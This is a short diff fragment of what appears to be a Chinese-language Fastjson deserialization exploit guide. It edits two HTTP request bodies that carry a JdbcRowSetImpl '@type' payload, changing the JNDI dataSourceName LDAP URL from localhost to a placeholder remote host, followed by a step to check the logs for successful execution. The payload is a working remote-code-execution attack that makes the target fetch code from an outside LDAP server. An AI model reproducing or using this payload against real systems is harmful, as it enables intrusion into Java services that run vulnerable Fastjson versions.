@@ -66,7 +66,7 @@ Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
 
 
 3. 查看日志是否执行成功
@@ -87,7 +87,7 @@ Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/Object","autoCommit":true}
 
 
 3. 查看日志是否执行成功
